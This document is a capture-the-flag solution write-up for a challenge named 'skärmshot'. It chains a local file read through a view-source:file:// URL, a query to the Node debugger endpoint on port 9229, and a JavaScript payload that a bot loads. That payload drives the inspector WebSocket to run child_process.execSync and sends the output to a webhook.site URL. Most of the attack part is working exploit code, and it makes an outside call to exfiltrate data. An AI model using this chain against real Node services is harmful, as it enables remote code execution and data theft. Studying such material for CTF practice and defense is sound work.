# Solve for skärmshot

## Step 1
First we need to exfiltrate the admin_token. We can do this by sending the following URL:
```
view-source:file:///app/config.js
```

## Step 2
The next step is that we need to exfiltrate the node debug id. We can do this by sending the following URL:
```
http://127.0.0.1:9229/json/list
```

## Step 3
We can now execute arbitrary code by making the bot visit a page containing the following code:
```javascript
window.ws = new WebSocket('ws://127.0.0.1:9229/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
ws.onerror = (e) => {
    fetch("https://webhook.site/REDACTED?e=" + btoa(e.toString()))
}
ws.onmessage = (e) => {
    fetch("https://webhook.site/REDACTED?e=" + btoa(e.data))
}
ws.onopen = () => {
    ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
            includeCommandLineAPI: true, 
            expression: `(function(){
                res = require("child_process").execSync("/app/readflag" ); 
                return new TextDecoder().decode(res);
            })();`
        }
    }))
}
```
Easy way run solve.py with all the values filled in.